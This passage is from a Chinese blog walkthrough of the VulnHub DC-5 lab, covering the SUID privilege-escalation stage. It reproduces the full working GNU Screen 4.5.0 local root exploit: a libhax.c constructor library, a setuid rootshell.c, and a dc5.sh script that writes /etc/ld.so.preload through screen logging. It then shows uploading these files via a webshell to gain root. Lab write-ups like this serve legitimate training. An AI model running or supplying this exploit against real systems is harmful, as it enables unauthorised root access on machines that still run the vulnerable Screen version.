+<h3 id="1-发现screen-4-5-0"><a href="#1-发现screen-4-5-0" class="headerlink" title="(1)发现screen-4.5.0"></a>(1)发现screen-4.5.0</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现screen-4<span class="token punctuation">.</span><span class="token number">5.0</span>，使用<span class="token number">41145</span><span class="token punctuation">.</span>sh脚本提权
+GNU <span class="token keyword">Screen</span>是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。
+GNU <span class="token keyword">Screen</span>可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>下面两条命令都行</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -user root -perm <span class="token number">-4000</span> -print <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> 
+find <span class="token operator">/</span> -perm -u<span class="token operator">=</span>s -type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220511216.png" alt="image-20240105220511216"></p>
+<h3 id="2-查找screen-4-5-0漏洞脚本文件"><a href="#2-查找screen-4-5-0漏洞脚本文件" class="headerlink" title="(2)查找screen 4.5.0漏洞脚本文件"></a>(2)查找screen 4.5.0漏洞脚本文件</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">searchsploit <span class="token keyword">screen</span> <span class="token number">4.5</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220707539.png" alt="image-20240105220707539"></p>
+<p>我们发现有两个发现screen 4.5.0 存在本地特权提升的漏洞，我们利用第一个，将脚本复制到本目录下</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">cp <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>exploitdb<span class="token operator">/</span>exploits<span class="token operator">/</span>linux<span class="token operator">/</span><span class="token keyword">local</span><span class="token operator">/</span><span class="token number">41154</span><span class="token punctuation">.</span>sh <span class="token punctuation">.</span><span class="token operator">/</span><span class="token number">41154</span><span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220909464.png" alt="image-20240105220909464"></p>
+<h3 id="3-查看cat-41154-sh脚本文件"><a href="#3-查看cat-41154-sh脚本文件" class="headerlink" title="(3)查看cat 41154.sh脚本文件"></a>(3)查看cat 41154.sh脚本文件</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221117944.png" alt="image-20240105221117944"></p>
+<p>由于终端看的不全，我们在kali里面进行查看</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221228736.png" alt="image-20240105221228736"></p>
+<h3 id="4-将第一部分内容写到libhax-c并编译"><a href="#4-将第一部分内容写到libhax-c并编译" class="headerlink" title="(4)将第一部分内容写到libhax.c并编译"></a>(4)将第一部分内容写到libhax.c并编译</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">按照脚本提示，先将第一部分内容写到libhax<span class="token punctuation">.</span>c中<span class="token punctuation">(</span>一共有三个部分<span class="token punctuation">)</span>
+创建一个文件夹存放三个部分的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221605803.png" alt="image-20240105221605803"></p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">创建libhax<span class="token punctuation">.</span>c文件，用vim编辑，当然，也可以直接使用vim创建文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221749403.png" alt="image-20240105221749403"></p>
+<p>写入如下文件</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>确认文件写入成功</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222042350.png" alt="image-20240105222042350"></p>
+<p>然后编译这个脚本,查看编译生成的os文件</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gcc -fPIC -shared -ldl -o libhax<span class="token punctuation">.</span>so libhax<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222145012.png" alt="image-20240105222145012"></p>
+<h3 id="5-将第二部分的代码写入rootshell-c并编译"><a href="#5-将第二部分的代码写入rootshell-c并编译" class="headerlink" title="(5)将第二部分的代码写入rootshell.c并编译"></a>(5)将第二部分的代码写入rootshell.c并编译</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">将第二部分的代码写入rootshell<span class="token punctuation">.</span>c文件并执行命令生成rootshell文件
+这里我直接采用vim创建文件
+因为步骤和第一部分是一样的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222916118.png" alt="image-20240105222916118"></p>
+<p>写入文件如下</p>
+<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">#include &lt;stdio.h&gt;
+int main(void)&#123;
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后编译这个脚本,查看编译生成的os文件</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gcc -fPIC -shared -ldl -o rootshell<span class="token punctuation">.</span>so rootshell<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105223042140.png" alt="image-20240105223042140"></p>
+<h3 id="6-将第三部分代码写入dc5-sh文件"><a href="#6-将第三部分代码写入dc5-sh文件" class="headerlink" title="(6)将第三部分代码写入dc5.sh文件"></a>(6)将第三部分代码写入dc5.sh文件</h3><p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!&#x2F;bin&#x2F;bash表示执行环境。最后保存是需要输入:set ff&#x3D;unix是为了防止脚本的格式错误。</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">#!<span class="token operator">/</span>bin<span class="token operator">/</span>bash
+echo <span class="token string">"[+] Now we create our /etc/ld.so.preload file..."</span>
+<span class="token keyword">cd</span> <span class="token operator">/</span>etc
+umask <span class="token number">000</span> # because
+<span class="token keyword">screen</span> -D -m -L <span class="token keyword">ld</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span>preload echo -ne  <span class="token string">"\x0a/tmp/libhax.so"</span> # newline needed
+echo <span class="token string">"[+] Triggering..."</span>
+<span class="token keyword">screen</span> -ls # <span class="token keyword">screen</span> itself <span class="token keyword">is</span> setuid<span class="token punctuation">,</span> so<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token operator">/</span>tmp<span class="token operator">/</span>rootshell <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">:</span><span class="token keyword">set</span> ff<span class="token operator">=</span>unix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105224111589.png" alt="image-20240105224111589"></p>
+<p>完成3个步骤后之间把三个文件上传至靶机的&#x2F;tmp文件下，然后执行.&#x2F;dc5即可提权。<br>将这三个文件传到靶机</p>
+<h2 id="5-上传文件到蚁剑"><a href="#5-上传文件到蚁剑" class="headerlink" title="5.上传文件到蚁剑"></a>5.上传文件到蚁剑</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225226138.png" alt="image-20240105225226138"></p>
+<p>执行dc5.sh</p>
+<p>注意给dc5.sh加执行权限</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">chmod <span class="token operator">+</span>x dc5<span class="token punctuation">.</span>sh
+chmod <span class="token number">777</span> dc5<span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225541899.png" alt="image-20240105225541899"></p>
+<p>拿到root用户，成功提权<br>在root目录下拿到flag</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225605774.png" alt="image-20240105225605774"></p>
+<h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1、靶场下载地址<br>2、nmap<br>3、文中用到的字典<br>4、[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell<br>5、[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包）<br>6、简谈SUID提权<br>7、实现交互式shell的几种方式<br>8、masscan<br>9、[ 常用工具篇 ] AntSword 蚁剑安装及使用详解<br>10、Web日志目录及日志分析</p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2023/12/25/vulnhub靶场之DC-5/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">一.环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%B8%8B%E8%BD%BD%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">2.下载靶场环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%90%AF%E5%8A%A8%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.</span> <span class="toc-text">3.启动靶场环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">二.渗透靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%9B%AE%E6%A0%87"><span class="toc-number">2.1.</span> <span class="toc-text">1.目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BA%E7%9C%9F%E5%AE%9EIP"><span class="toc-number">2.2.1.</span> <span class="toc-text">(1)寻找靶机真实IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8E%A2%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.2.</span> <span class="toc-text">(2)探端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">2.2.3.</span> <span class="toc-text">(3)web指纹识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">3.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AEweb%E8%AE%BF%E9%97%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">(1)访问web访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-bp%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85"><span class="toc-number">2.3.2.</span> <span class="toc-text">(2)bp是否存在文件包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Fuzz%E7%A1%AE%E8%AE%A4%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.3.3.</span> <span class="toc-text">(3)Fuzz确认存在文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A1%AE%E8%AE%A4%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.3.4.</span> <span class="toc-text">(4)确认日志文件的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.5.</span> <span class="toc-text">(5)写入一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%86%99%E5%85%A5phpinfo"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">1)写入phpinfo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%86%99%E5%85%A5webshell"><span class="toc-number">2.3.5.2.</span> <span class="toc-text">2)写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%B0%E5%BB%BAshell%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.5.3.</span> <span class="toc-text">3)新建shell文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%88%91%E4%BB%AC%E8%AE%BF%E9%97%AE%E6%96%B0%E7%9A%84%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.3.5.4.</span> <span class="toc-text">4)我们访问新的页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%96%B0%E7%9A%84webshell"><span class="toc-number">2.3.5.5.</span> <span class="toc-text">5)蚁剑连接新的webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%8F%8D%E5%BC%B9shell%E5%88%B0kali"><span class="toc-number">2.3.6.</span> <span class="toc-text">(6)反弹shell到kali</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-suid%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">4.suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%91%E7%8E%B0screen-4-5-0"><span class="toc-number">2.4.1.</span> <span class="toc-text">(1)发现screen-4.5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E6%89%BEscreen-4-5-0%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.2.</span> <span class="toc-text">(2)查找screen 4.5.0漏洞脚本文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8Bcat-41154-sh%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.3.</span> <span class="toc-text">(3)查看cat 41154.sh脚本文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%86%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%86%99%E5%88%B0libhax-c%E5%B9%B6%E7%BC%96%E8%AF%91"><span class="toc-number">2.4.4.</span> <span class="toc-text">(4)将第一部分内容写到libhax.c并编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%B0%86%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%E7%9A%84%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5rootshell-c%E5%B9%B6%E7%BC%96%E8%AF%91"><span class="toc-number">2.4.5.</span> <span class="toc-text">(5)将第二部分的代码写入rootshell.c并编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%B0%86%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5dc5-sh%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.6.</span> <span class="toc-text">(6)将第三部分代码写入dc5.sh文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%E8%9A%81%E5%89%91"><span class="toc-number">2.5.</span> <span class="toc-text">5.上传文件到蚁剑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E7%9B%B8%E5%85%B3%E8%B5%84%E6%BA%90"><span class="toc-number">3.</span> <span class="toc-text">三.相关资源</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2023/11/01/vulnhub靶场之DC-4/">vulnhub靶场之DC-4</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<script src="http://cdn.yangxiang.cc/prism.js"></script>
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"k6N2g0tPj8SmwCncTSgZw8Tu-gzGzoHsz","appKey":"0V4MZk4kTbePYKI37YdvB8KX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2023/12/25/vulnhub靶场之DC-5/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦! 不良信息举报联系方式QQ:2564854865。 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">津ICP备2023003852号</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        console.log(_commentDom)
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"在你的身边","artist":"秦嘉宇","url":"music/秦嘉宇 - 在你的身边（0.8x）-盛哲.mp3","cover":"http://p1.music.126.net/AYNBdRxJ8EdZo4xFjp7b4Q==/109951163191178425.jpg?param=130y130"},{"name":"遗憾皆在风中","artist":"浪子梦人","url":"music/浪子梦人 - 浪子梦人-遗憾皆在风中.mp3","cover":"https://y.qq.com/music/photo_new/T002R300x300M000002tcmXu1G3LH1_1.jpg?max_age=2592000"},{"name":"账号已注销","artist":"LoneyZ","url":"music/LoneyZ - 账号已注销.mp3","cover":"http://p2.music.126.net/KPDzw-YRcN7b95OMH92UNQ==/109951167116023059.jpg?param=130y130"},{"name":"最后一页","artist":"焦小飞","url":"music/焦小飞 - 精焦小飞-最后一页(热播版)（焦小飞 remix）.mp3","cover":"http://p2.music.126.net/XvVUZQTCxmhjNOcfEnJYew==/109951163610134059.jpg?param=130y130"},{"name":"把回忆拼好给你","artist":"IMYeah","url":"music/IMYeah - 把回忆拼好给你(0.85x降3.5).mp3","cover":"https://s2.music.126.net/style/web2/img/coverall.png?226ab2ee0396f839ddaff122272f7315"},{"name":"起风了","artist":"过客","url":"music/过客 - 起风了（抖音完整版）伴奏.mp3","cover":"https://s2.music.126.net/style/web2/img/coverall.png?226ab2ee0396f839ddaff122272f7315"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("06/06/2023 00:00:00");//在此处修改你的建站时间，格式：月/日/年 时:分:秒
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+
+<i class="fas fa-chart-area"></i>
+<span class="post-count">字数统计：22.2k</span>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      if (/^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(location.pathname.replace(rootPath, ''))) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+          window.loadImageFn();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+      // $('.main-container').fadeIn()
+    })
+  </script>
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":200},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
